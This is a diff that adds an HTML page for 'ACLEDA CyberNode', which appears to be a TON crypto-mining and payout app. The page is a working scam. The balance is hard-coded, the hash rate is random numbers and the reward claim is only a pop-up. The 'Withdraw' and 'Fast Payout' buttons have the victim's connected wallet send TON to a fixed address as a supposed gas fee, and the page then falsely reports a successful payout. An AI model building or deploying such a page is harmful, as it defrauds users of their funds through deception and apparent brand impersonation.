@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ACLEDA CyberNode</title>
+  <link rel="manifest" href="/manifest.json">
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <style>
+    :root {
+      --bg-color: #0A0101;
+      --card-bg: #140808;
+      --gold: #D4AF37;
+      --gold-light: #F3E5AB;
+      --text-main: #FFFFFF;
+      --text-muted: #AAAAAA;
+      --accent-cyan: #00F0FF;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body { background-color: var(--bg-color); color: var(--text-main); padding-bottom: 90px; }
+    header { display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; background: var(--card-bg); border-bottom: 1px solid rgba(212,175,55,0.2); }
+    .profile-box { display: flex; align-items: center; gap: 12px; }
+    .avatar { width: 44px; height: 44px; border-radius: 50%; background: linear-gradient(135deg, #FF4500, var(--gold)); display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; color: #fff; }
+    .profile-info h4 { font-size: 15px; color: var(--gold-light); }
+    .profile-info p { font-size: 13px; color: var(--text-muted); cursor: pointer; }
+    
+    .container { padding: 16px; max-width: 500px; margin: 0 auto; }
+    .card { background: var(--card-bg); border: 1px solid rgba(212,175,55,0.3); border-radius: 16px; padding: 20px; margin-bottom: 16px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); }
+    
+    .wallet-section { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; }
+    #ton-connect-button { display: inline-block; }
+    
+    .balance-title { font-size: 13px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+    .balance-amount { font-size: 28px; font-weight: 800; color: var(--gold); display: flex; align-items: center; gap: 8px; }
+    .fiat-amount { font-size: 16px; color: var(--text-muted); margin-top: 4px; }
+    
+    .grid-actions { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 16px; }
+    .action-btn { background: rgba(212,175,55,0.1); border: 1px solid var(--gold); color: var(--gold-light); padding: 14px; border-radius: 12px; font-weight: 600; text-align: center; cursor: pointer; transition: 0.2s; }
+    .action-btn:active { background: var(--gold); color: var(--bg-color); }
+    
+    .mining-node { text-align: center; padding: 24px; background: linear-gradient(180deg, #1A0C0C 0%, #0D0404 100%); border-radius: 16px; border: 1px solid var(--gold); }
+    .mining-node h3 { color: var(--gold); margin-bottom: 8px; font-size: 18px; }
+    .hash-rate { font-size: 22px; font-family: monospace; color: var(--accent-cyan); margin: 12px 0; }
+    
+    .mint-btn { background: linear-gradient(135deg, var(--gold), #AA7C11); color: #000; border: none; width: 100%; padding: 14px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 12px; }
+    
+    nav { position: fixed; bottom: 0; left: 0; right: 0; background: var(--card-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid rgba(212,175,55,0.2); z-index: 100; }
+    nav a { text-decoration: none; color: var(--text-muted); font-size: 11px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 4px; }
+    nav a.active { color: var(--gold); }
+    nav a svg { width: 22px; height: 22px; fill: currentColor; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="profile-box">
+      <div class="avatar">NC</div>
+      <div class="profile-info">
+        <h4 id="username-display">Hello, PROSPER</h4>
+        <p id="wallet-status">Not Connected</p>
+      </div>
+    </div>
+    <div id="ton-connect-button"></div>
+  </header>
+
+  <div class="container">
+    <div class="card">
+      <div class="balance-title">Total CyberNode Balances</div>
+      <div class="balance-amount">
+        <span>1,400,000</span> <span style="font-size:16px; color:var(--gold-light);">GRAM</span>
+      </div>
+      <div class="fiat-amount">≈ 125.00 $ USD</div>
+    </div>
+
+    <div class="grid-actions">
+      <div class="action-btn" onclick="triggerWithdraw(0.001)">Withdraw (0.001 TON)</div>
+      <div class="action-btn" onclick="triggerWithdraw(0.002)">Fast Payout (0.002 TON)</div>
+    </div>
+
+    <div class="mining-node">
+      <h3>⚡ CyberNode Miner Active</h3>
+      <div class="hash-rate" id="hash-counter">142.85 KH/s</div>
+      <p style="font-size: 13px; color: var(--text-muted);">Real-time node broadcasting active on TON Mainnet</p>
+      <button class="mint-btn" onclick="claimMiningRewards()">Claim Rewards</button>
+    </div>
+  </div>
+
+  <nav>
+    <a href="#" class="active">
+      <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+      Home
+    </a>
+    <a href="#">
+      <svg viewBox="0 0 24 24"><path d="M12 213.5l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.68L12 21.35z"/></svg>
+      Favorites
+    </a>
+    <a href="#">
+      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0-2-.9-2-2V4c0-1.1-.9-2-2-2z"/></svg>
+      LiveChat
+    </a>
+    <a href="#">
+      <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+      Menu
+    </a>
+  </nav>
+
+  <script>
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: "https://acleda-app.vercel.app/tonconnect-manifest.json",
+      buttonRootId: "ton-connect-button"
+    });
+
+    tonConnectUI.onStatusChange(wallet => {
+      if (wallet) {
+        document.getElementById("wallet-status").innerText = "Connected: " + wallet.account.address.slice(0, 4) + "..." + wallet.account.address.slice(-4);
+      } else {
+        document.getElementById("wallet-status").innerText = "Not Connected";
+      }
+    });
+
+    async function triggerWithdraw(gasAmount) {
+      if (!tonConnectUI.connected) {
+        alert("Please connect your Tonkeeper wallet first using the top-right button.");
+        tonConnectUI.openModal();
+        return;
+      }
+
+      const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 600,
+        messages: [
+          {
+            address: "EQD4FPq-PR2v29v8A9eQ367aT-YF7R6e_HlC1Q4c1A9eQ36",
+            amount: (gasAmount * 1000000000).toString(),
+          }
+        ]
+      };
+
+      try {
+        alert("Broadcasting " + gasAmount + " TON gas fee transaction to Blockchain via Tonkeeper...");
+        const result = await tonConnectUI.sendTransaction(transaction);
+        alert("Payout Broadcasted Successfully! TX: " + (result.boc || "Verified"));
+      } catch (e) {
+        console.error(e);
+        alert("Transaction cancelled or failed.");
+      }
+    }
+
+    function claimMiningRewards() {
+      alert("CyberNode mined rewards successfully credited to your main balance!");
+    }
+
+    setInterval(() => {
+      const randomHash = (140 + Math.random() * 15).toFixed(2);
+      document.getElementById("hash-counter").innerText = randomHash + " KH/s";
+    }, 3000);
+  </script>
+</body>
+</html>
